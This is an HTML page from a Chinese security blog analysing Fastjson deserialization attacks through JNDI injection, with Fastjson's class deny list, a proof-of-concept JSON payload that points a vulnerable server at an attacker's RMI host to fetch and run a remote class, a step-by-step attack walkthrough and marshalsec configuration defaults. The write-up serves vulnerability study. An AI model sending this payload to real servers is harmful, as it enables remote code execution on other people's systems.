@@ -1,0 +1,54 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Manning23"><title>Fastjson反序列化之基于JNDI利用方式 · Manning23</title><meta name="description" content="Fastjson反序列化介绍Java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、以及今天的主角fastjson，fastjson是阿里巴巴一个开源的json相关的java library，地址在这里，https://github.com/alibaba/fas"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Manning23</a></h3><div class="description"><p>Technology &amp; Life</p></div></div></div><ul class="social-links"><li><a href="http://weibo.com/2077484845"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li></div><div class="information"><div class="back_btn"><li><a onclick="window.history.go(-1)" class="fa fa-chevron-left"> </a></li></div><div class="avatar"><img src="/images/avatar.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Fastjson反序列化之基于JNDI利用方式</a></h3></div><div class="post-content"><h2 id="Fastjson反序列化介绍"><a href="#Fastjson反序列化介绍" class="headerlink" title="Fastjson反序列化介绍"></a>Fastjson反序列化介绍</h2><p>Java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、以及今天的主角fastjson，fastjson是阿里巴巴一个开源的json相关的java library，地址在这里，<a href="https://github.com/alibaba/fastjson，Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上，它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象。" target="_blank" rel="external">https://github.com/alibaba/fastjson，Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上，它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象。</a></p>
+<p>Fastjson序列化和反序列化：</p>
+<ul>
+<li>Fastjson序列化：通过JSON.toJSONString()方法，将对象转化成JSON格式的字符串</li>
+<li>Fastjson反序列化：JSON.parseObject()方法，将JSON格式的字符串转化成对象</li>
+</ul>
+<h2 id="Fastjson反序列化漏洞介绍"><a href="#Fastjson反序列化漏洞介绍" class="headerlink" title="Fastjson反序列化漏洞介绍"></a>Fastjson反序列化漏洞介绍</h2><p>官方给出的补丁文件，主要的更新在这个checkAutoType函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。具体包括</p>
+<pre><code>bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework
+</code></pre><p>核心部分就是denyList的处理过程，遍历denyList，如果引入的库以denyList中某个deny打头，就会抛出异常，中断运行。</p>
+<h2 id="基于JNDI的利用过程图解"><a href="#基于JNDI的利用过程图解" class="headerlink" title="基于JNDI的利用过程图解"></a>基于JNDI的利用过程图解</h2><p><img src="/2018/03/01/Fastjson反序列化jndi利用过程分析/1.png"></p>
+<h4 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h4><ul>
+<li>被攻击服务器能解析json载荷，并且存在fastjson漏洞。</li>
+<li>攻击者服务器开启了rmi服务（通常为1099端口）和http服务（其它文件服务也行，如ftp）</li>
+</ul>
+<h4 id="攻击POC"><a href="#攻击POC" class="headerlink" title="攻击POC"></a>攻击POC</h4><pre><code>{
+    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    &quot;dataSourceName&quot;:&quot;rmi://172.16.55.180:1099/Exploit&quot;,
+    &quot;autoCommit&quot;:true
+}
+</code></pre><h4 id="攻击过程详解"><a href="#攻击过程详解" class="headerlink" title="攻击过程详解"></a>攻击过程详解</h4><ul>
+<li>步骤1，攻击者向被攻击者发送序列化后的json攻击payload</li>
+<li>步骤2，被攻击者服务器解析攻击payload后，通过jndi接口连接payload中的rmi服务器（该服务器需要为黑客控制的服务器）</li>
+<li>步骤3，攻击者服务器的rmi服务通过了其请求，返还其请求的对象。（可以是对象的codebase地址）</li>
+<li>步骤4，被攻击服务器收到对象后，发现本地不存在，接着向攻击者提供的远程对象地址请求对象，也就是请求攻击者服务器的http端口上的class文件。</li>
+<li>步骤5，攻击者服务器的http服务返回class文件到被攻击者服务器。被攻击者执行class文件中的恶意代码。</li>
+</ul>
+<h4 id="从数据包的角度看下整个过程"><a href="#从数据包的角度看下整个过程" class="headerlink" title="从数据包的角度看下整个过程"></a>从数据包的角度看下整个过程</h4><p><img src="/2018/03/01/Fastjson反序列化jndi利用过程分析/2.png"></p>
+<p>从上图可以看出两点</p>
+<ol>
+<li>被攻击服务器首先连接了黑客提供的rmi接口。</li>
+<li>被攻击服务器在本地未找到类对象的时候，又去访问了黑客提供的codebase代码，也就是http服务提供的class文件。</li>
+</ol>
+<h4 id="讲一下什么是codebase。"><a href="#讲一下什么是codebase。" class="headerlink" title="讲一下什么是codebase。"></a>讲一下什么是codebase。</h4><p>这个在我看marshalsec的时候，发现利用里有如下的内容</p>
+<pre><code>exploit.jndiUrl, defaults to ldap://localhost:1389/obj
+exploit.codebase, defaults to http://localhost:8080/
+exploit.codebaseClass, defaults to Exploit
+exploit.exec, defaults to /usr/bin/gedit
+</code></pre><p>其实现在看来，就是jndi注入的四个先决条件。</p>
+<ol>
+<li>exploit.jndiUrl的意思，攻击者要传递的jndi地址，比如rmi的，ldap的。</li>
+<li>exploit.codebase的意思，攻击者提供的http服务器，提供下载远程class的地址。</li>
+<li>exploit.codebaseClass的意思，攻击者在http服务器提供下载类的名称。默认的名称为Exploit，因此生成的poc的就会访问 <a href="http://localhost:8080/Exploit.class" target="_blank" rel="external">http://localhost:8080/Exploit.class</a></li>
+<li>exploit.exec的意思，攻击者执行的恶意命令</li>
+</ol>
+<h2 id="其他知识思考"><a href="#其他知识思考" class="headerlink" title="其他知识思考"></a>其他知识思考</h2><p>之前在研究Java反序列化的时候，思维惯性认为Java反序列化的漏洞的利用方式都是跟Java原生的ObjectInputStream 类的 readObject() 方法似的，直接解析一个存在漏洞的库，如Apache Commons Collections。但是基于Jndi的利用方式就一直搞不懂。</p>
+<p>其实基于Jndi的利用方式跟原来的利用方式是类似的，只是反序列化后又进行了几次自身请求外部对象操作，本质上是通过反序列化漏洞进行Jndi注入（Java代码注入）。原来反序列化漏洞是直接进行RCE，基于JNDI的反序列化利用是Java代码注入。</p>
+<p>最后感谢ninty师傅在工作中帮我捋清思路。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a href="http://www.cnblogs.com/mrchang/p/6789060.html" target="_blank" rel="external">http://www.cnblogs.com/mrchang/p/6789060.html</a></li>
+<li><a href="https://paper.seebug.org/292/" target="_blank" rel="external">https://paper.seebug.org/292/</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/31686208" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/31686208</a></li>
+<li><a href="https://mp.weixin.qq.com/s/YeskekfkHhHH4kA-02W7Yg" target="_blank" rel="external">https://mp.weixin.qq.com/s/YeskekfkHhHH4kA-02W7Yg</a></li>
+</ul>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2018-03-01</span><i class="fa fa-tag"></i></div></div></div></div><div class="share"><div class="evernote"><a href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank" class="fa fa-bookmark"></a></div><div class="weibo"><a href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));" class="fa fa-weibo"></a></div><div class="twitter"><a href="http://twitter.com/home?status=,http://yoursite.com/2018/03/01/Fastjson反序列化jndi利用过程分析/,Manning23,Fastjson反序列化之基于JNDI利用方式,;" class="fa fa-twitter"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a role="navigation" href="/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/" title="Struts2 S2-052远程代码执行漏洞分析 CVE-2017-9805" class="btn">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
